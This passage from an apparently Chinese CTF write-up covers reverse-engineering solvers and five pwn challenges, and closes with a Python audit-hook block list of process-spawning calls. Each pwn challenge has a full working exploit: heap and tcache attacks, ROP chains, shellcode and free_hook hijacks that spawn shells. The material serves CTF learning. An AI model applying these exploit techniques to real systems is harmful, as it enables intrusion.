0xFF, 0x03, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x05, 0x03]
def sub_1352(a1,a2,a3):
if a2 >= 0 and a3 >= 0 and a2 <= 19 and a3 <= 19:
    return ((a1[(20 * a2 + a3) // 8] & 0xff) >> ((20 * a2 + a3) & 7)) & 1
else:
    return 0
def sub_13C9(a1,a2,a3):
v5 = 0
for i in range(-1,2):
    for j in range(-1,2):
    v5 += sub_1352(a1,i+a2,j+a3)
return v5
s = Solver()
flag = [BitVec(f"v{i}",8) for i in range(50)]
for i in range(20):
for j in range(20):
    if table[i * 20 + j] != 0xff:
    v2 = table[20 * i + j]
    v5 = sub_13C9(flag, i,j)

    s.add(v2 == v5)
res = ""
if s.check() == sat:
data = s.model()
for i in flag:
    res += hex(data[i].as_long())[2:].rjust(2,"0")
flag = ""
for i in res:
    if i == "0":
    flag += "a"
    if i == "1":
    flag += "b"
    if i == "2":
    flag += "c"
    if i == "3":
    flag += "d"
    if i == "4":
    flag += "e"
    if i == "5":
    flag += "f"
    if i == "6":
    flag += "0"
    if i == "7":
    flag += "1"
    if i == "8":
    flag += "2"
    if i == "9":
    flag += "3"
    if i == "a":
    flag += "4"
    if i == "b":
    flag += "5"
    if i == "c":
    flag += "6"
    if i == "d":
    flag += "7"
    if i == "e":
    flag += "8"
    if i == "f":
    flag += "9"
print(hashlib.md5(flag.encode()).hexdigest())

1.JAVA层没东西直接看so，通过字符串定位函数。

2.此函数将字符串转为C语言类型的字符串存在v231中。

3.往下看发现赋值给了另一个数组在下面作为参数传入带函数中。

4.大致就是将输入经过几个函数加密后和密文比较

5.程序中有很多相同的代码,都是虚假控制流不用看直接看逻辑清晰的代码就好

def sub_62F0(a1,char_list):

while a1 > 0:
    char_list.append(a1 % 0xA + 0x30)
    a1 //= 10

return char_list[::-1]

def sub_6D20(a1,a2,s):
v110 = len(a1)
v109 = len(a2)
v108 = v109 + v110
v126 = [0] * v108
for j in range(v110 - 1,-1,-1):
    for m in range(v109 - 1, -1, -1):
    v103 = m + j + 1
    v102 = v126[v103] + (a2[m] - 48) * (a1[j] - 48)
    v126[v103] = v102 % 10
    v126[m + j] += v102 // 10

for i in range(v108):
    s.append(v126[i] + 0x30)

return s
def sub_8270(a1,a2,a3):
s = a1[::-1]
print(s)
v112 = 0
for j in range(len(s)):
    v109 = v112 + a2 * (s[j] - 48)
    v112 = v109 // 10
    v127 = v109 % 10 + 48
    a3.append(v127)

a3 = a3[::-1]

return a3

def sub_9890(a1,a2,a3):
s = a1[::-1]
dest = a2[::-1]
v84 = len(s)
v83 = len(dest)
v82 = 0
if v84 <= v83:
    v77 = v83
else:
    v77 = v84

for j in range(v77):
    if j >= v84:
    v61 = 0
    else:
    v61 = s[j] - 48

    if  j >= v83:
    v60 = 0
    else:
    v60 = dest[j] - 48
    v79 = v82 + v60 + v61
    v82 = v79 // 10
    v95 = v79 % 10 + 48
    a3.append(v95)
a3 = a3[::-1]

return a3

def sub_A8F0(a1,a2,a3):
s = a1[::-1]

dest = a2[::-1]
v122 = len(s)
v121 = len(dest)

v120 = 0

for j in range(v122):
    if (j >= v121):
    v101 = 0
    else:
    v101 = dest[j] - 48
    v117 = s[j] - 48 - v101

    a3.append(v117 + 0x30)

while a3[-1] == 0x30:
    a3 = a3[:-1]

return a3[::-1]

def sub_C160(a1,a2):
s = a1
v60 = len(a1)
v59 = 0
for j in range(v60):
    v56 = (s[j] - 48 + 10 * v59)
    v59 = v56 % 2
    src = (v56 // 2 + 48)
    a2.append(src)
return a2

def main(a1):
char_list = []
char_list = sub_62F0(a1,char_list)
s = sub_6D20(char_list,char_list,[])
v62 = sub_8270(char_list,2,[])
v61 = sub_9890(s,v62,[])
print(v61)
v60 = sub_A8F0(v61,[0x33],[])
print(v60)
res = sub_C160(v60,[])

return bytes(res).decode()

import math
import libnum
enc = [999272289930604998,1332475531266467542,1074388003071116830,1419324015697459326,978270870200633520,369789474534896558,344214162681978048,2213954953857181622]

for i in range(len(enc)):
a = enc[i] * 2 + 3
flag = int(math.sqrt(a + 1) - 1)
print(libnum.n2s(flag)[::-1].decode(),end="")

Pwn

SU_BABY

在add_files的时候多次增加V4，会造成src的栈溢出，循环通过我们自己可控并不是一次一次增加的，所以这个v4的长度我们可控

但是需要绕过一个canary的检查，注意到使用的是read输入，strlen()来获取长度，并且赋值到src的时候又是使用的read返回的参数，就会有一个参数不一致的现象，导致我输入的长度和增加的长度不一致，可以使用这个漏洞来绕过canary的检查。

查看保护的时候发现栈为RWX，需要泄露栈地址我们就可以任意执行shellocde了，在add_sigID中，通过自行输入来增加ID，这个时候栈上会有残留，可以泄露出来libc地址和stack地址。

然后通过display_sigdb泄露地址。通过add_files劫持rip到栈上执行shellcode最后绕过一个简单沙盒就行。

img
import time 
from pwn import * 
from ctypes import * 
from LibcSearcher import * 
 
RED = ' 33[91m' 
GREEN = ' 33[92m' 
YELLOW = ' 33[93m' 
BLUE = ' 33[94m'  
RESET = ' 33[0m'  
u64_Nofix=lambda p:
u64(p.recvuntil(b'n')[:-1].ljust(8,b'x00')) 
u64_fix=lambda p:
u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00')) 
u64_8bit=lambda p:
u64(p.recv(8)) 
dir  =    lambda s :
log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s))) 
def int_fix(p,count=12): 
    p.recvuntil(b'0x') 
    return int(p.recv(count),16) 
# p = process(["qemu-arm","-g", "2233","../chall"]) 
 
FILENAME='./pwn' 
elf=ELF(FILENAME) 
libc=elf.libc 
 
debug =int(sys.argv[1]) 
print(f"debug -> {debug}") 
context.arch='amd64' 
 
if debug == 0: 
    argv=['aa'] 
    p=process([FILENAME]+argv) 
if debug == 1: 
    p = remote('1.95.76.73',10001) 
 
if debug ==2: 
    gdbscript = ''' 
        b* 0x402778 
        c 
    ''' 
    argv=['a'*21] 
    p = gdb.debug([FILENAME]+argv, gdbscript=gdbscript) 
     
def command(option): 
    p.recvuntil(b'+++++++++++++++++++++++++++++++++++++++++++++') 
    p.sendline(bytes(str(option),'utf-8')) 
 
def add_code(id,name,buf): 
    command(1) 
    p.recvuntil(b'ID:') 
    p.sendline(bytes(str(id),'utf-8')) 
    p.recvuntil(b':') 
    p.send(name) 
    p.recvuntil(b':') 
    p.send(buf) 
    print((p.recvline().decode('utf-8'))) 
def del_code(id): 
    command(2) 
    p.recvuntil(b'ID:') 
    p.sendline(bytes(str(id),'utf-8')) 
def add_file(name,buf): 
    command(8) 
    p.recvuntil(b':') 
    p.sendline(bytes(str(1),'utf-8')) 
    do_add_file(name,buf) 
def do_add_file(name,buf): 
    p.recvuntil("请输入文件名称".encode()) 
    p.sendline(name) 
    p.recvuntil("请输入文件内容".encode()) 
    p.send(buf) 
def show_code(): 
    command(5) 
    p.sendlineafter(b':',b'1') 
sh=''' 
    lea rsi,[rip+0x10101010] 
    sub rsi,0x10101010 
    xor rdi,rdi 
    xor edx,edx 
    mov dl,0xff 
    xor rax,rax 
    syscall 
''' 
 
# gdb.attach(p,'b* 0x4014FB') 
code=[1,2,20,27,33,56,68,69,87] 
code.reverse() 
print(code) 
for i in code: 
    del_code(i) 
attack_code=[] 
count=0 
for i in range(0x1314,0x1314+12+len(code)-1,1): 
    print(f"count -> {count} ",end="") 
    count+=1 
    payload=f'mowen{i}'.encode() 
    length=len(payload) 
    if(i==0x1314):
payload=payload+b'a'*(0x12-length-1)+b'_' 
    if(i==0x1314+1):
payload=payload+b'a'*(0x2a-length-1)+b'_' 
    if(i==0x1314+2):
payload=asm(sh) 
    add_code(i,'mowen',payload) 
    attack_code.append(i) 
show_code() 
p.recvuntil(b'_') 
libc_addr=u64_Nofix(p) 
dir("libc_addr") 
 
p.recvuntil(b'_') 
stack_addr=u64_Nofix(p) 
dir("stack_addr") 
 
command(8) 
p.recvuntil(b':') 
p.sendline(bytes(str(0x100),'utf-8')) 
do_add_file(b'mowen123',b'a'*8)
# b20 
do_add_file(b'mowen123',b'b'*8)
# b3e 
do_add_file(b'mowen123',b'c'*8+b'x00') # b47 
do_add_file(b'mowen123',b'x12')
# b50 
do_add_file(b'mowen123',b'e'*7+b'x00')  
payload=p64(stack_addr-0xadea) 
do_add_file(b'mowen123',payload) 
do_add_file(b'mowen123',b'x00'*8+b'x00') 
 
print(asm(sh)) 
 
sleep(1) 
sh2=f''' 
    {shellcraft.open("flag")} 
    {shellcraft.read('rax','rsp',0x100)} 
    {shellcraft.write(1,'rsp',0x100)} 
''' 
p.sendline(b'x90'*(0x20)+asm(sh2)) 

p.interactive() 

SU_text

漏洞一：show 可以越界

int *__fastcall sub_17D8(int *a1)
{
  write(1, (char *)a1 + *a1 + 4, 8uLL);
  return a1 + 1;
}

漏洞二：

在同一个步骤的操作中，虽然 store 和 load 限制了  0x410

但是在 sub_1D5D 中同样可以操作操作同一片内存的指针，比如先利用 xor 写 0x200 字节，那么最后就可以越界到 0x200 + 0x410

于是利用上面所说的功能，越界打 larger bin attack 修改 mp.tcahce_bin_max_size ，tcache bin attack 打 栈。

题目难点是需要用堆来泄露 libc ，不然会和远程有区别

exp

from pwn import *
from struct import pack
from ctypes import *
import base64
from subprocess import run
#from LibcSearcher import *
from struct import pack
import tty

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :
print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :
u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
l64 = lambda    :
u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
uu32    = lambda    :
u32(p.recv(4).ljust(4,b'x00'))
uu64    = lambda    :
u64(p.recv(6).ljust(8,b'x00'))
int16   = lambda data   :
int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

context(os='linux', arch='amd64', log_level='debug')
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

def create(idx, size):
    pay = b'x01x10'+p8(idx)+p32(size)
    return pay

def dele(idx):
    pay = b'x01x11'+p8(idx)
    return pay

ADD = 0x10
SUB = 0x11
MUL = 0x12
DIV = 0x13
SET_OFFSET_VAL = 0x14
GET_OFFSET_VAL = 0x15
PRINT = 0x16
def xx0(idx):
    pay = b'x02'+p8(idx)+b'x10'

def start_xx1(idx):
    return b'x02'+p8(idx)

def xx1_0(method, val0, val1 = 0):
    if val0 < 0:
        pay = b'x10'+p8(method)+p32(0x100000000+val0)
    else:
        pay = b'x10'+p8(method)+p32(val0)
    if method == SET_OFFSET_VAL or method == GET_OFFSET_VAL:
        pay += p64(val1)
    elif method == PRINT:
        pass
    else:
        pay += p32(val1)
    return pay

LS = 0x10
RS = 0x11
XOR = 0x12
OR = 0x13
AND = 0x14
def xx1_1(method, val):
    pay = b'x11'+p8(method)+ val + p32(0)
    return pay

def stop_xx1():
    return b'x00'

def next_step():
    return b'x03'

def store(idx, offset, value):
    return start_xx1(idx) + xx1_0(SET_OFFSET_VAL, offset, value) + stop_xx1()
def load(idx, heap_offset, data_offset):
    return start_xx1(idx) + xx1_0(GET_OFFSET_VAL, heap_offset, data_offset) + stop_xx1()
def show(idx, offset):
    return start_xx1(idx) + xx1_0(PRINT, offset) + stop_xx1()

def xor(idx, val):
    pl = start_xx1(idx)
    for i in range(len(val)//4):
        pl += xx1_1(0x12, val[i*4:i*4+4])
    pl += stop_xx1()
    return pl

def xor_(idx, val):
    pl = start_xx1(idx)
    for i in range(len(val)//4):
        pl += xx1_1(0x12, val[i*4:i*4+4])
    return pl
def store_(offset, value):
    return xx1_0(SET_OFFSET_VAL, offset, value)
def load_(offset, value):
    return xx1_0(GET_OFFSET_VAL, offset, value)

#p = remote('1.95.76.73', 10011)
p = process('./pwn')

#debug('b *$rebase(0x1784)nb *$rebase(0x17d8)')

# show libc_base
pl  = create(0, 0x500)
pl += create(0xf, 0x500)
pl += dele(0)
pl += create(0, 0x500)

pl += load(0, 0, 0)
pl += show(0, -0x11)

pl += next_step()

sa(b'bytes):n', pl)
libc_base = u64(r(8)) - 0x203b20

#debug('b *$rebase(0x17d8)nb _exitnb *$rebase(0x1784)n')

pl  = create(1, 0x428)
pl += create(2, 0x418)
pl += create(3, 0x418)
pl += dele(1)
pl += create(4, 0x438)
pl += dele(3)
pl += next_step()
sa(b'bytes):n', pl)

# show heap_base

pl = xor_(0xf, b'x00'*0x200)
pl += load_(0x328, 0)
pl += stop_xx1()
pl += next_step()
sa(b'bytes):n', pl)

pl = show(0xf, 0x500)
pl += next_step()
sa(b'bytes):n', pl)
heap_base = u64(r(8)) - 0xcb0

# lager bin attack

mp = libc_base + 0x2031f0

_IO_list_all = libc_base + libc.sym['_IO_list_all']
pl = xor_(0xf, b'x00'*0x200)
pl += store_(0x328, mp - 0x20 - 8)
pl += stop_xx1()
pl += create(5, 0x438)
pl += next_step()
sa(b'bytes):n', pl)

pl = create(0x7, 0x500)
pl += create(0x8, 0x500)
pl += create(0x9, 0x500)

pl += dele(0x9)
pl += dele(0x8)
pl += next_step()
sa(b'bytes):n', pl)

#debug('b _exitnb freenb malloc')
key = (heap_base + 0x2000) >> 12
environ = libc_base + 0x20ad58

pl = xor_(0x7, b'x00'*0x200)
pl += store_(0x310, key ^ (environ - 0x28))
pl += stop_xx1()
pl += create(0xa, 0x500)
pl += create(0xb, 0x500)

pl += next_step()
sa(b'bytes):n', pl)

#debug('b *$rebase(0x17d8)nb _exitnb mallocnb *$rebase(0x1784)n')

pl = xor_(0xb, b'x00'*0x10)
pl += load_(0x18, 0)
pl += stop_xx1()
pl += next_step()
sa(b'bytes):n', pl)

pl = show(0x0, 0x28)
pl += next_step()
sa(b'bytes):n', pl)

stack = u64(r(8))

pl = create(0xc, 0x500)
pl += create(0xd, 0x500)
pl += create(0xe, 0x500)
pl += dele(0xe)
pl += dele(0xd)
pl += next_step()
sa(b'bytes):n', pl)

key = (heap_base + 0x3000) >> 12
pl = xor_(0xc, b'x00'*0x200)
pl += store_(0x310, key ^ (stack - 0x178))
pl += stop_xx1()
pl += create(0xe, 0x500)
pl += create(0xd, 0x500)
pl += next_step()
sa(b'bytes):n', pl)

#debug('b *$rebase(0x1f56)n')

rop = ROP(libc)

rax = libc_base + 0x00000000000dd237
rdi = libc_base + 0x000000000010f75b
rsi = libc_base + 0x0000000000110a4d
ret = libc_base + 0x000000000002882f

#0x000000000004b2d2 : mov edx, eax ; mov eax, 8 ; sub eax, edx ; ret
mov_edx_eax = libc_base + 0x000000000004b2d2
syscall = libc_base + (rop.find_gadget(['syscall','ret'])).address

pl = start_xx1(0xd)
pl += store_(0x20, rax)
pl += store_(0x28, 0)
pl += store_(0x30, mov_edx_eax)
pl += store_(0x38, rax)
pl += store_(0x40, 2)
pl += store_(0x48, rdi)
pl += store_(0x50, stack - 0x90)
pl += store_(0x58, rsi)
pl += store_(0x60, 0)
pl += store_(0x68, syscall)

pl += store_(0x70, rax)
pl += store_(0x78, 0x100)
pl += store_(0x80, mov_edx_eax)
pl += store_(0x88, rax)
pl += store_(0x90, 0)
pl += store_(0x98, rdi)
pl += store_(0xa0, 3)
pl += store_(0xa8, rsi)
pl += store_(0xb0, stack + 0x100)
pl += store_(0xb8, syscall)

pl += store_(0xc0, rax)
pl += store_(0xc8, 1)
pl += store_(0xd0, rdi)
pl += store_(0xd8, 1)
pl += store_(0xe0, syscall)

pl += store_(0xe8, int(b'x00galf/'.hex(), 16))

pl += store_(0x18, ret)
pl += stop_xx1()

pl += next_step()
sa(b'bytes):n', pl) 

lg('stack', stack)
lg('environ', environ)
lg('mp', mp)
lg('_IO_list_all', _IO_list_all)
lg('heap_base', heap_base)
lg('libc_base', libc_base)

inter()
pause()

SU_JIT16

漏洞是 sub_17CB 存在功能分支的越界，其中的 case 4: 可以越界到 jmp

，将

0x11 直接写到 shellcode 中，并且没有修正

于是题目变成了执行两个字节 shellcode 的题目，这里是读入 /bin/sh 后执行 execve 系统调用

exp

from pwn import *
from struct import pack
from ctypes import *
import base64
from subprocess import run
#from LibcSearcher import *
from struct import pack
import tty

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :
print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :
u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
l64 = lambda    :
u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
uu32    = lambda    :
u32(p.recv(4).ljust(4,b'x00'))
uu64    = lambda    :
u64(p.recv(6).ljust(8,b'x00'))
int16   = lambda data   :
int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

context(os='linux', arch='amd64')
elf = ELF('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def mov_reg_data(reg, data):
    pay = p8(1) + p8((reg<<4)&0b11110000) + p16(data)
    return pay

def mov_reg_reg(reg0, reg1):
    reg = ((reg0<<4)&0b11110000) | (reg1&0b1111)
    pay = p8(0) + p8(reg) + p16(0xffff)
    return pay

def adc_reg_reg(reg0, reg1):
    reg = ((reg0<<4)&0b11110000) | (reg1&0b1111)
    pay = p8(0b10001) + p8(reg) + p16(0xffff)
    return pay

def add_reg_reg(reg0, reg1):
    reg = ((reg0<<4)&0b11110000) | (reg1&0b1111)
    pay = p8(0b10000) + p8(reg) + p16(0xffff)
    return pay

def sbb_reg_reg(reg0, reg1):
    reg = ((reg0<<4)&0b11110000) | (reg1&0b1111)
    pay = p8(0b100001) + p8(reg) + p16(0xffff)
    return pay

def sub_reg_reg(reg0, reg1):
    reg = ((reg0<<4)&0b11110000) | (reg1&0b1111)
    pay = p8(0b100000) + p8(reg) + p16(0xffff)
    return pay

def not_reg(reg):
    pay = p8(0b1000000) + p8(reg) + p16(0xffff)
    return pay

def neg_reg(reg):
    pay = p8(0b1000001) + p8(reg) + p16(0xffff)
    return pay

def shr_reg(reg):
    pay = p8(0b1000010) + p8(reg) + p16(0xffff)
    return pay

def test_reg(reg):
    pay = p8(0b1000100) + p8(reg) + p16(0xffff)
    return pay

def jmp(offset):
    if offset < 0:
        return p8(0b1010000) + p8(0xff) + p16(0x10000+offset)
    else:
        return p8(0b1010000) + p8(0xff) + p16(offset)

def jz(offset):
    if offset < 0:
        return p8(0b1010001) + p8(0xff) + p16(0x10000+offset)
    else:
        return p8(0b1010001) + p8(0xff) + p16(offset)

def load_l(reg0, reg1):
    reg = ((reg0<<4)&0b11110000) | (reg1&0b1111)
    pay = p8(0b1100000) + p8(reg) + p16(0xffff)
    return pay

def load_x(reg0, reg1):
    reg = ((reg0<<4)&0b11110000) | (reg1&0b1111)
    pay = p8(0b1100001) + p8(reg) + p16(0xffff)
    return pay

def store_l(reg0, reg1):
    reg = ((reg0<<4)&0b11110000) | (reg1&0b1111)
    pay = p8(0b1110000) + p8(reg) + p16(0xffff)
    return pay

def store_x(reg0, reg1):
    reg = ((reg0<<4)&0b11110000) | (reg1&0b1111)
    pay = p8(0b1110001) + p8(reg) + p16(0xffff)
    return pay

def clc():
    return p8(0b10000000) + p8(0) + p16(0)

def mov_reg_data_(reg, data):
    print(reg, data)
    pay = p8(1) + p8((reg<<4)&0b11110000) + b'x0fx05'
    return pay

def sc(data):
    return p8(1) + p8(0) + asm(data)

p = process('./pwn')
#p = remote('1.95.131.201', 10002)

#debug('b *$rebase(0x274d)n')
#debug('b *$rebase(0x2181)n')

pl = b''

pl += test_reg(4) # jmp $0x11
pl += clc()*0xf
pl += sc('push rsp; pop rsi')

pl += mov_reg_data(3, 0x40)

pl += test_reg(4) # jmp $0x11
pl += clc()*0xf
pl += sc('syscall')

pl += mov_reg_data(0, 0x3b)
pl += mov_reg_data(3, 0)

pl += test_reg(4) # jmp $0x11
pl += clc()*0xf
pl += sc('push rsi; pop rdi')

pl += test_reg(4) # jmp $0x11
pl += clc()*0xf
pl += sc('xor esi, esi')

pl += test_reg(4) # jmp $0x11
pl += clc()*0xf
pl += sc('syscall')

sa(b'Input ur code:n', pl)

sleep(1)
s(b'/bin/shx00')

inter()
#pause()

SU_msg_cfgd

C++菜单题，先注册两个handler。

MainLoop::
handle_dispatch函数再依据输入选择对应的handler进行菜单操作。

其中通过parseTLVCfgCMD函数进行参数处理。

数据参数格式如下：

struct param{
    _DWORD optcode;
    _DWORD config_name_size;
    _BYTE config_name[config_name_size];
    _DWORD content_size;
    _BYTE content[content_size];
}

MsgHandler::
handleCMD函数基于optcode进行功能选择，有get、add、update、delete、visit操作。

RemoteHandler::
cmdAdd会调用MsgHandler::
update_obj来进行操作。

MsgHandler::
update_obj会遍历(this+16)的vector，找到对应config_name的元素，并进行替换，找不到则添加。

替换之后会把指向该元素的迭代器赋值给(this+40)，这样的迭代器会导致未定义行为。

MsgHandler::
visit_obj函数会进行vector::
end的check，如果该迭代器不指向末尾则进行元素数据的打印。

这里的check很明显存在漏洞，当我们创建a、b、c三个元素，然后让迭代器指向c，此时删除b、c两个元素，即可使end指向b而非c，此时就能绕过判断，打印已经释放了的堆块数据从而造成泄露。

同样MsgHandler::
cmdUpdate函数也检查不严格，可以绕过check实现uaf修改已释放堆块数据。

这里的思路就是，利用堆风水使得释放的元素c指向unsortedbin，泄露libc基地址，再重新构造堆风水实现tcachebin attack劫持free_hook为system从而getshell。

from pwn import *

class Command:
    def __init__(self):
        self.code_head = b''
        self.code = b''
        self.cnt = 0

    def set_dispatch_handler(self,handler):
        self.code_head += p32(1)+p32(handler)

    def get(self,name):
        self.code += p32(0) + p32(len(name)) + name + p32(0) +b'x00'
        self.cnt+=1

    def add(self,name,content):
        self.code += p32(1)+p32(len(name))+name+p32(len(content))+content+b'x00'
        self.cnt += 1

    def update(self,name,content):
        self.code += p32(2) + p32(len(name)) + name + p32(len(content)) + content +b'x00'
        self.cnt += 1

    def dele(self,name):
        self.code += p32(3) + p32(len(name)) + name + p32(0) +b'x00'
        self.cnt += 1

    def visit(self):
        self.code += p32(4) + p32(0) + p32(0) +b'x00'
        self.cnt += 1

    def get_code(self):
        return self.code_head+p32(self.cnt)+self.code

    def clear(self):
        self.code_head = b''
        self.code = b''
        self.cnt = 0

libc = ELF("./libc.so.6")
# p = gdb.debug("./main",'b *$rebase(0x00000000000367A)')
p = process('./main')

cmd = Command()
'''构造大堆块uaf，泄露libc'''
cmd.set_dispatch_handler(ord('a'))
cmd.add(b'a',b'a'*0x500)
cmd.add(b'b',b'a')
cmd.add(b'c',b'a')
cmd.add(b'c',b'a'*0x410)
cmd.add(b'd',b'a'*0x400)
cmd.dele(b'd')
cmd.dele(b'c')
cmd.dele(b'b')
cmd.visit()
p.sendlineafter("ommand:",cmd.get_code())
p.recvuntil('nContent: ')
libc.address = u64(p.recv(6)+p16(0))-0x13140-0x1d9aa0
print('libc:',hex(libc.address))
cmd.clear()
'''堆风水，实现tcachebin attack'''
cmd.set_dispatch_handler(ord('a'))
#填满tcache，将堆块c放入fastbin中间位置
cmd.add(b'a',b'a'*0x40)
cmd.add(b'b',b'a'*0x40)
cmd.add(b'c',b'a'*0x40)
cmd.add(b'd',b'a'*0x40)
cmd.add(b'e',b'a'*0x40)
cmd.add(b'f',b'a'*0x40)
cmd.add(b'g',b'a'*0x40)
cmd.add(b'h',b'a'*0x40)
cmd.add(b'i',b'a'*0x40)
#使迭代器指向堆块c
cmd.add(b'c',b'a'*0x40)
cmd.dele(b'i')
cmd.dele(b'h')
cmd.dele(b'g')
cmd.dele(b'f')
cmd.dele(b'e')
cmd.dele(b'd')
cmd.dele(b'c')
cmd.dele(b'b')
cmd.dele(b'a')
#触发double free，并重新取回来修改fd，劫持free_hook
cmd.update(p64(libc.symbols['__free_hook']-0x20).ljust(0x40),b'2'*0x40)
#把tcache清空，将fastbin链入tcache
cmd.add(b'a',b'a'*0x40)
cmd.add(b'b',b'a'*0x40)
cmd.add(b'c',b'a'*0x40)
cmd.add(b'd',b'a'*0x40)
cmd.add(b'e',b'a'*0x40)
#劫持free_hook到system
cmd.add(b'/bin/sh',b'a'*0x10+p64(libc.symbols['system']).ljust(0x30))
p.sendlineafter("ommand:",cmd.get_code())

# gdb.attach(p)
p.interactive()

SU_PAS_sport

pascal语言用fpc静态编译的程序，没有符号表，只得通过测试推断函数作用。

大致逆出input、output、iocheck、getfd这几个函数。

基于输入进行菜单选择。

openfd函数会根据输入打开不同的文件句柄，这里会创建不同大小的堆块来存放io结构体。

但文件都是/dev/urandom。

create函数会创建大小为n(n<=1024)的堆块，此处sizeOfSea变量被优先更改了，如果n大于1024，堆块不会重新创建但是sizeOfSea还是会被更改，即可造成溢出。

pull函数则是将fd1或fd2的内容写入create申请的chunk中，这里fd1读入的是bytes类型，fd2读入的是text类型(文本输入数字再转化为byte)。

因为fd1和fd2都是打开的/dev/urandom文件，所以读入内容都是随机的，且因为fd2的格式限制，随机读入会触发输入格式异常。

通过分析io结构体，发现偏移为0处存放了它的文件描述符3。

经过测试，将3改为0时，它会改为从键盘读入数据。

因此我们可以利用先前的堆块溢出，淹没io结构体的文件描述符，因为是全随机的，所以有1/256的概率使其变成0.

扭转输入之后，我们还需要进行后续利用。

通过逆向分析，发现sub_419F90函数(alloc的size大于0x218时调用)和unsortedbin操作一样，且无check。

只需要满足堆块size和请求size一致即可取出该堆块，并进行bk->fd=fd,fd->bk=bk的操作。

所以我们的思路是劫持已释放的堆块size、fd、bk，利用脱链实现任意地址写它自身，修改chunk指针指向自己，再去二次修改chunk指针实现任意地址改。

在跟踪"/bin/sh"字符时，我们可以发现一个疑似system函数的funtion，其地址为0x454E10。经过测试验证确实是system。

而create再申请新chunk前会释放旧chunk，且freeChunk是基于函数指针操作的，故我们可以直接劫持该函数指针为system。虽然程序执行流程会调用多次free，但system并不会导致程序崩溃仍可正常利用。

from pwn import *

def open_gate(idx):
    p.sendlineafter('choice >', str(1))
    p.sendlineafter('Which gate?',str(idx))

def close_gate(idx):
    p.sendlineafter('choice >', str(2))
    p.sendlineafter('Which gate?',str(idx))

def create_ocean(size):
    p.sendlineafter('choice >', str(3))
    p.sendlineafter('ocean.',str(size))

def pull_gate2ocean(size,idx):
    p.sendlineafter('choice >', str(4))
    p.sendlineafter('data',str(size))
    p.sendlineafter('Which gate?',str(idx))

def l2str(val):
    strs = hex(val)[2:].rjust(16,'0')
    ret = ''
    for i in range(7,-1,-1):
        ret += str(int(strs[i*2:(i+1)*2],16))+' '
    return ret

# p = gdb.debug('./chall','b *0x0000000004019DCnb *0x00000000004016D1')
# gdb.attach(p,'b *0x00000000040123Bncnset {char}*(long*)0x47e540=0')
# gdb.attach(p,'b *0x0000000004012CCncnset {char}*(long*)0x47e550=0')
# pause()
while True:
    p = process('./chall')
    try :
        magic_gadget = 0x0000000000402aff
        create_ocean(0x220)
        open_gate(2)
        open_gate(1)
        close_gate(2)
        create_ocean(0x2000)
        pull_gate2ocean(0x240+0x3a0+1,1)
        pull_gate2ocean(0x260,1)
        payload = b'a'*0x238+p64(0x3a0)+p64(0x47E580-0x20)+p64(0x47E580-0x18)
        payload = payload.ljust(0x260)
        time.sleep(0.5)
        p.send(payload)
        open_gate(2)
        pull_gate2ocean(0x30,1)
        payload1 = p64(1)*4+p64(0x465B00)+p64(0)
        payload1 = payload1.ljust(0x30,b'x00')
        time.sleep(0.5)
        p.send(payload1)
        pull_gate2ocean(8,1)
        time.sleep(0.5)
        p.send(p64(0x000000000454E10))
        create_ocean(8)
        pull_gate2ocean(8, 1)
        time.sleep(0.5)
        p.send(b'/bin/sh;')
        create_ocean(8)
        p.interactive()
        break
    
except:
        p.close()

文末:

欢迎师傅们加入我们:

星盟安全团队纳新群1:
222328705

星盟安全团队纳新群2:
346014666

有兴趣的师傅欢迎一起来讨论!

PS:
团队纳新简历投递邮箱：

xmcve@qq.com

责任编辑：@Elite


```
import sys

DEBUG = False

def audit_hook(event, args):
    audit_functions = {
        "os.system": {"ban": True},
        "subprocess.Popen": {"ban": True},
        "subprocess.run": {"ban": True},
        "subprocess.call": {"ban": True},
        "subprocess.check_call": {"ban": True},
        "subprocess.check_output": {"ban": True},
        "_posixsubprocess.fork_exec": {"ban": True},
        "os.spawn": {"ban": True},
        "os.spawnlp": {"ban": True},
        "os.spawnv": {"ban": True},
        "os.spawnve": {"ban": True},
        "os.exec": {"ban": True},
        "os.execve": {"ban": True},
        "os.execvp": {"ban": True},
        "os.execvpe": {"ban": True},
        "os.fork": {"ban": True},
        "shutil.run": {"ban": True},
        "ctypes.dlsym": {"ban": True},
        "ctypes.dlopen": {"ban": True}
    }
    if event in audit_functions:
        if DEBUG:
            print(f"[DEBUG] found event {event}")
        policy = audit_functions[event]
        if policy["ban"]:
            strr = f"AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}"
            print(strr)
            raise PermissionError(f"[AUDIT BANNED]{event} is not allowed.")
        else:
            strr = f"[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}"
            print(strr)
            return

sys.addaudithook(audit_hook)
